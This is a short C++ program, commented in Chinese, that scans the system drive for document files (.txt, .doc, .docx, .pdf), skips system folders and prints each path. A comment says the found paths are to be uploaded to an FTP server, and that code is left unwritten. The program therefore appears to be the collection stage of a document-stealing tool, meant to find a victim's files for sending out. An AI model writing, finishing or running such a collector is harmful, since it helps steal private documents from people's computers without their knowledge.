#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>

#ifdef _WIN32
#include <Windows.h>
#endif

// 1. 获取系统驱动器的盘符
std::string getSystemDriveLetter() {
    #ifdef _WIN32
    char systemDriveLetter = 'C';
    char systemDrivePath[MAX_PATH] = { 0 };

    if (GetSystemDirectoryA(systemDrivePath, sizeof(systemDrivePath))) {
        systemDriveLetter = systemDrivePath[0];
    }
    return std::string(1, systemDriveLetter) + ":\\";
    #else
    return "/";
    #endif
}

// 2. 检查是否是敏感文件
bool isSensitiveFile(const std::string& filename) {
    // 定义敏感文件的扩展名列表
    const std::vector<std::string> sensitiveExtensions = { ".txt", ".doc", ".docx", ".pdf" };

    std::string extension = std::filesystem::path(filename).extension().string();

    // 如果文件的扩展名在敏感扩展名列表中，返回 true
    return std::find(sensitiveExtensions.begin(), sensitiveExtensions.end(), extension) != sensitiveExtensions.end();
}

// 3. 检查是否忽略某些路径
bool shouldIgnorePath(const std::string& path) {
    // 定义要忽略的路径列表
    const std::vector<std::string> ignorePaths = { "\\Windows\\", "\\Program Files\\", "\\Program Files (x86)\\" };

    for (const auto& ignorePath : ignorePaths) {
        if (path.find(ignorePath) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// 4. 获取文件路径
std::vector<std::string> getFilepaths(const std::string& rootPath) {
    std::vector<std::string> filepaths;

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath)) {
            if (!entry.is_directory()) {
                std::string path = entry.path().string();
                if (!shouldIgnorePath(path) && isSensitiveFile(path)) {
                    filepaths.push_back(path);
                }
            }
        }
    } catch (std::filesystem::filesystem_error& e) {
        std::cerr << "Error while accessing filesystem: " << e.what() << std::endl;
    }

    return filepaths;
}

// 5. 初始化扫描器
void initializeScanner() {
    std::string systemDriveLetter = getSystemDriveLetter();
    std::cout << "Scanning system drive: " << systemDriveLetter << std::endl;

    std::vector<std::string> sensitiveFiles = getFilepaths(systemDriveLetter);
    std::cout << "Found " << sensitiveFiles.size() << " sensitive files:" << std::endl;

    for (const auto& filepath : sensitiveFiles) {
        std::cout << filepath << std::endl;
        // 上传文件路径到FTP服务器的代码，这里需要根据具体的FTP库实现
    }
}

int main() {
    initializeScanner();
    return 0;
}
